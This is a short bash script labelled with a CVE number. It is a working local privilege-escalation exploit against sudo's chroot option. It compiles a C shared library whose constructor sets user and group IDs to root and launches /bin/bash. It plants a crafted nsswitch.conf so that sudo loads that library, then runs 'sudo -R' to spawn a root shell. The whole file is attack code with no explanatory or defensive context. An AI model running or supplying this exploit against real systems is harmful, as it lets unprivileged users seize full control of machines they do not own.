#!/bin/bash

#
# CVE-2025-32462
#

STAGE=$(mktemp -d /tmp/cve) 
cd "${STAGE?}" || exit 1

cat > blah.c <<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void blah(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p blah/etc libnss_
echo "passwd: /blah" > blah/etc/nsswitch.conf
cp /etc/group blah/etc
gcc -shared -fPIC -Wl,-init,blah -o libnss_/blah.so.2 blah.c

echo "Launching exploit..."
sudo -R blah blah